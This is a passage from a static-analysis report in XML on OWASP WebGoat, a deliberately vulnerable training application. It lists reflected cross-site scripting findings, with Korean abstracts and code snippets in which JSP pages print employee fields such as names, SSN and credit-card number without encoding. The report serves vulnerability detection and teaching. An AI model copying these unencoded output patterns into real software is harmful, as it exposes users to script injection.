<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="455DDBA664E521B6B477EBB38E15AE07" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 79 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>79</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;input name="&lt;%=RoleBasedAccessControl.DESCRIPTION%&gt;" type="text" class="lesson_text_db" value="&lt;%=employee.getPersonalDescription()%&gt;" size="58"/&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="680DB28469798DD68BBF3293E947D31E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPersonalDescription()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="64BA5464896041A4F2AFA7B0D62EA53B" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C3326FC70AC577D4188C03DC1617EF6A" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>LogSpoofing.java의 createContent() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>LogSpoofing.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LogSpoofing.java</FilePath>
<LineStart>110</LineStart>
<Snippet>	    TR row4 = new TR();
	    row4.addElement(
		    new TD(new PRE("Login failed for username: "
			    + inputUsername))).setBgColor(HtmlColor.GRAY);
</Snippet>
<TargetFunction>org.apache.ecs.html.PRE.PRE()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ACC1ECD43D53B5C9782C563221F1CAF1" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 200 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>200</LineStart>
<Snippet>				&lt;/div&gt;
				&lt;div id="lessonContent"&gt;&lt;%=webSession.getInstructions()%&gt;&lt;/div&gt;
				&lt;div id="message" class="info"&gt;&lt;%=webSession.getMessage()%&gt;&lt;/div&gt;
	
			&lt;%</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D1A65BACC7873A294E32634E64B53CC5" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 171 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>171</LineStart>
<Snippet>			//System.out.println("Redirecting to " + thisPage);
		%&gt;
			&lt;script language="javascript"&gt;location.href="&lt;%=thisPage%&gt;"&lt;/script&gt;
		&lt;%
		}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>507</LineStart>
<Snippet>	{
		String thisLink = "attack";
		Enumeration e = request.getParameterNames();
		boolean isFirstParameter = true;
		while (e.hasMoreElements())</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="071F24BD820C639FE995A55D1FB92A00" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="739B8111231472E45F5DD7C8430AA9FA" ruleID="798E4513-03B3-4252-A644-FBA596AEFB2B">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Screen.java의 output() 메서드가 261 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Screen.java</FilePath>
<LineStart>261</LineStart>
<Snippet>	// otherwise we're doing way too much SSL encryption work

	out.print(content.toString());

    }</Snippet>
<TargetFunction>java.io.PrintWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9EC81C1C581E8F966C71912B6203835F" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=SQLInjection.DISCIPLINARY_NOTES%&gt;"  cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6719DAC42FA71498973EFC2D6CBECA87" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 58 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AA5D66DED5DE91C6AE439F34E730C02E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5C69448BCD294D97B2070D3E1521B884" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C5E9A6B8EAC406603C01D21BEBE2190D" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F43BDDFF1F11C667ED524A1D125ACA63" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 getSource() 메서드가 688 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>688</LineStart>
<Snippet>
	Head head = new Head();
	head.addElement(new Title(getSourceFileName()));
	head.addElement(new StringElement(
		"&lt;meta name=\"Author\" content=\"Bruce Mayhew\"&gt;"));</Snippet>
<TargetFunction>org.apache.ecs.html.Title.Title()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F977F2275BFC58EFAAD5125545B07740" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=CrossSiteScripting.DISCIPLINARY_NOTES%&gt;" cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5976DFB6975546BF039781366010232D" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8C31F08A712DA360B6BE99DEDC0F3618" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4E92BCDCEA371CF03CEAB2DFE6B7CCBD" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B6AC6177E079CA7FBA4E0143075BD275" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6599309C30AE61C093B1A0389FBA2B8A" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 51 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D500704855CA580679F04B607428DAB2" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
